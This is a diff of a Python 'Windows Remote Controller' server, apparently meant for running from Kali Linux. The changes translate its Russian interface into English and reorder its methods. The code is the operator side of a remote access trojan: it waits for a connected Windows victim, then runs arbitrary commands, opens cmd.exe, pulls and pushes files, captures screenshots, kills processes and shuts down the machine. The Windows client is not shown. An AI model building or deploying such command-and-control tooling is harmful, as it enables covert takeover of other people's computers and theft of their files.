@@ -1,24 +1,20 @@
 #!/usr/bin/env python3
 """
 SERVER FOR KALI - Управление Windows с Kali
-Запуск: python3 server_kali.py
+Запуск: python3 server_kali_fixed.py
 """
 
 import socket
-import threading
 import os
 import sys
 import time
-import subprocess
 from colorama import init, Fore, Back, Style
 
 init(autoreset=True)
 
-# Цвета
 R = Fore.RED
 G = Fore.GREEN
 Y = Fore.YELLOW
-B = Fore.BLUE
 C = Fore.CYAN
 RESET = Style.RESET_ALL
 
@@ -35,29 +31,10 @@ class KaliServer:
         os.system('clear')
         print(f"""
 {R}╔═══════════════════════════════════════════════════════════════╗
-║     💀 WINDOWS REMOTE CONTROLLER v1.0 💀                       ║
-║     [KALI LINUX] → [WINDOWS]                                   ║
+║     WINDOWS REMOTE CONTROLLER v1.0                            ║
+║     [KALI LINUX] -> [WINDOWS]                                 ║
 ╚═══════════════════════════════════════════════════════════════╝{RESET}
         """)
-    
-    def start(self):
-        self.banner()
-        
-        # Получаем IP
-        host = self.get_ip()
-        
-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        server.bind(('0.0.0.0', PORT))
-        server.listen(1)
-        
-        print(f"{C}[*] Сервер запущен на {host}:{PORT}{RESET}")
-        print(f"{Y}[!] Жду подключения...{RESET}\n")
-        
-        self.client, addr = server.accept()
-        print(f"{G}[+] ПОДКЛЮЧЕН! {addr}{RESET}\n")
-        
-        self.shell()
     
     def get_ip(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -66,27 +43,41 @@ class KaliServer:
         s.close()
         return ip
     
+    def start(self):
+        self.banner()
+        host = self.get_ip()
+        
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        server.bind(('0.0.0.0', PORT))
+        server.listen(1)
+        
+        print(f"{C}[*] Server started on {host}:{PORT}{RESET}")
+        print(f"{Y}[!] Waiting for connection...{RESET}\n")
+        
+        self.client, addr = server.accept()
+        print(f"{G}[+] CONNECTED! {addr}{RESET}\n")
+        
+        self.shell()
+    
     def send_cmd(self, cmd):
         try:
             self.client.send(cmd.encode('utf-8'))
             response = self.client.recv(BUFFER).decode('utf-8', errors='ignore')
             return response
         except:
-            return "[!] Ошибка связи"
+            return "[!] Connection error"
     
     def download_file(self, remote_path):
-        """Скачать файл с Windows"""
         filename = os.path.basename(remote_path)
         cmd = f"DOWNLOAD {remote_path}"
         self.client.send(cmd.encode('utf-8'))
         
-        # Получаем размер файла
         size_data = self.client.recv(BUFFER).decode()
         if size_data.startswith("FILE_SIZE:"):
             file_size = int(size_data.split(":")[1])
             self.client.send(b"READY")
             
-            # Получаем файл
             with open(filename, 'wb') as f:
                 received = 0
                 while received < file_size:
@@ -94,15 +85,14 @@ class KaliServer:
                     f.write(data)
                     received += len(data)
             
-            print(f"{G}[+] Файл сохранен: {filename}{RESET}")
-            return f"[+] Скачано: {filename}"
+            print(f"{G}[+] File saved: {filename}{RESET}")
+            return f"[+] Downloaded: {filename}"
         else:
             return size_data
     
     def upload_file(self, local_path, remote_path):
-        """Загрузить файл на Windows"""
         if not os.path.exists(local_path):
-            return f"[-] Файл не найден: {local_path}"
+            return f"[-] File not found: {local_path}"
         
         file_size = os.path.getsize(local_path)
         cmd = f"UPLOAD {remote_path} {file_size}"
@@ -116,17 +106,14 @@ class KaliServer:
         return response
     
     def take_screenshot(self):
-        """Сделать скриншот Windows"""
         self.client.send(b"SCREENSHOT")
         time.sleep(2)
         
-        # Получаем размер
         size_data = self.client.recv(BUFFER).decode()
         if size_data.startswith("SCREEN_SIZE:"):
             file_size = int(size_data.split(":")[1])
             self.client.send(b"READY")
             
-            # Получаем скриншот
             with open("screenshot.png", 'wb') as f:
                 received = 0
                 while received < file_size:
@@ -134,28 +121,27 @@ class KaliServer:
                     f.write(data)
                     received += len(data)
             
-            print(f"{G}[+] Скриншот сохранен: screenshot.png{RESET}")
-            return "[+] Скриншот сохранен"
+            print(f"{G}[+] Screenshot saved: screenshot.png{RESET}")
+            return "[+] Screenshot saved"
         else:
             return size_data
     
     def shell(self):
-        """Интерактивная оболочка"""
-        print(f"{C}═══════════════════════════════════════════════════════════════{RESET}")
-        print(f"{G}[+] Управление Windows{RESET}")
-        print(f"{Y}Команды:{RESET}")
-        print(f"  {C}cmd <команда>{RESET}   - выполнить команду")
-        print(f"  {C}shell{RESET}           - запустить cmd.exe")
-        print(f"  {C}download <файл>{RESET} - скачать файл с Windows")
-        print(f"  {C}upload <локальный> <удаленный>{RESET} - загрузить файл")
-        print(f"  {C}screenshot{RESET}      - сделать скриншот")
-        print(f"  {C}ps{RESET}             - список процессов")
-        print(f"  {C}kill <PID>{RESET}      - убить процесс")
-        print(f"  {C}msg <текст>{RESET}     - показать сообщение")
-        print(f"  {C}shutdown{RESET}        - выключить ПК")
-        print(f"  {C}restart{RESET}         - перезагрузить")
-        print(f"  {C}exit{RESET}            - закрыть соединение")
-        print(f"{C}═══════════════════════════════════════════════════════════════{RESET}\n")
+        print(f"{C}============================================================{RESET}")
+        print(f"{G}[+] Windows Control Active{RESET}")
+        print(f"{Y}Commands:{RESET}")
+        print(f"  {C}cmd <command>{RESET}    - execute command")
+        print(f"  {C}shell{RESET}            - start cmd.exe")
+        print(f"  {C}download <file>{RESET}  - download file from Windows")
+        print(f"  {C}upload <local> <remote>{RESET} - upload file")
+        print(f"  {C}screenshot{RESET}       - take screenshot")
+        print(f"  {C}ps{RESET}              - list processes")
+        print(f"  {C}kill <PID>{RESET}       - kill process")
+        print(f"  {C}msg <text>{RESET}       - show message")
+        print(f"  {C}shutdown{RESET}         - shutdown PC")
+        print(f"  {C}restart{RESET}          - restart PC")
+        print(f"  {C}exit{RESET}             - close connection")
+        print(f"{C}============================================================{RESET}\n")
         
         while self.running:
             try:
@@ -192,13 +178,13 @@ class KaliServer:
                     print(response)
                 
                 elif cmd == "shutdown":
-                    confirm = input(f"{R}[!] Точно выключить? (y/n): {RESET}")
+                    confirm = input(f"{R}[!] Shutdown? (y/n): {RESET}")
                     if confirm.lower() == 'y':
                         response = self.send_cmd("shutdown")
                         print(response)
                 
                 elif cmd == "restart":
-                    confirm = input(f"{R}[!] Точно перезагрузить? (y/n): {RESET}")
+                    confirm = input(f"{R}[!] Restart? (y/n): {RESET}")
                     if confirm.lower() == 'y':
                         response = self.send_cmd("restart")
                         print(response)
@@ -216,7 +202,7 @@ class KaliServer:
                         response = self.upload_file(local, remote)
                         print(response)
                     else:
-                        print("[-] Использование: upload <локальный_файл> <удаленный_путь>")
+                        print("[-] Usage: upload <local_file> <remote_path>")
                 
                 elif cmd.startswith("cmd "):
                     command = cmd[4:]
@@ -233,14 +219,14 @@ class KaliServer:
                     print(response)
                     
             except KeyboardInterrupt:
-                print(f"\n{Y}[!] Прервано{RESET}")
+                print(f"\n{Y}[!] Interrupted{RESET}")
                 self.running = False
                 break
             except Exception as e:
-                print(f"{R}[-] Ошибка: {e}{RESET}")
+                print(f"{R}[-] Error: {e}{RESET}")
         
         self.client.close()
-        print(f"{G}[+] Соединение закрыто{RESET}")
+        print(f"{G}[+] Connection closed{RESET}")
 
 if __name__ == "__main__":
     server = KaliServer()
